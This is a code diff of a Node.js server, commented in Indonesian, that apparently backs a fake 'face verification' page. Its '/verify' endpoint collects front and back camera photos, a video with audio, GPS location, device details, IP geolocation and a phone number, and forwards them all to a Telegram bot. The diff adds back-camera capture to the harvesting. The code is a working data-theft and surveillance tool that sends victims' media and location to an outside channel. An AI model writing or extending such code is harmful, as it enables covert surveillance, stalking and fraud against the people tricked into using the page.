@@ -16,7 +16,7 @@ console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
 console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
 console.log('========================================');
 
-app.use(express.json({ limit: '100mb' })); // Perbesar limit untuk video
+app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 app.use(express.static('public'));
 
@@ -52,14 +52,14 @@ async function getLocationDetails(ip) {
 // ============================================
 async function sendToTelegram(data) {
     try {
-        const { image, video, gps, device, ip, timestamp, phone, locationData } = data;
+        const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
         const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
-        // Kirim FOTO dulu
-        if (image) {
-            const photoBuffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+        // KIRIM FOTO DEPAN
+        if (frontPhoto) {
+            const buffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
 
-            let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
+            let caption = `🟡 *VERIFIKASI WAJAH - DEPAN*\n\n`;
             caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
             caption += `🕒 *Waktu:* ${time}\n\n`;
 
@@ -84,8 +84,8 @@ async function sendToTelegram(data) {
             const form = new FormData();
             form.append('chat_id', CHAT_ID);
             form.append('caption', caption);
-            form.append('photo', photoBuffer, {
-                filename: `foto_${Date.now()}.jpg`,
+            form.append('photo', buffer, {
+                filename: `foto_depan_${Date.now()}.jpg`,
                 contentType: 'image/jpeg'
             });
 
@@ -95,7 +95,25 @@ async function sendToTelegram(data) {
             });
         }
 
-        // Kirim VIDEO + AUDIO
+        // KIRIM FOTO BELAKANG
+        if (backPhoto) {
+            const buffer = Buffer.from(backPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
+
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('caption', `📸 *Foto Belakang*\nUser: ${phone || 'Tidak diketahui'}`);
+            form.append('photo', buffer, {
+                filename: `foto_belakang_${Date.now()}.jpg`,
+                contentType: 'image/jpeg'
+            });
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: form
+            });
+        }
+
+        // KIRIM VIDEO + AUDIO
         if (video) {
             const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
             const videoBuffer = Buffer.from(videoBase64, 'base64');
@@ -114,7 +132,7 @@ async function sendToTelegram(data) {
             });
         }
 
-        // Kirim lokasi GPS
+        // KIRIM LOKASI GPS
         if (gps) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
@@ -142,18 +160,18 @@ app.post('/verify', async (req, res) => {
     console.log('📸 Time:', new Date().toISOString());
 
     try {
-        const { image, video, gps, device, timestamp, phone } = req.body;
+        const { frontPhoto, backPhoto, video, gps, device, timestamp, phone } = req.body;
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
 
-        console.log(`📸 Image: ${image ? 'YES' : 'NO'}`);
+        console.log(`📸 Front Photo: ${frontPhoto ? 'YES' : 'NO'}`);
+        console.log(`📸 Back Photo: ${backPhoto ? 'YES' : 'NO'}`);
         console.log(`📹 Video: ${video ? 'YES' : 'NO'}`);
-        console.log(`📱 GPS:`, gps);
 
         const locationData = await getLocationDetails(ip);
 
-        // Kirim ke Telegram
         const result = await sendToTelegram({
-            image,
+            frontPhoto,
+            backPhoto,
             video,
             gps,
             device,
@@ -196,5 +214,4 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📹 Video + Audio recording: 10 seconds`);
 });
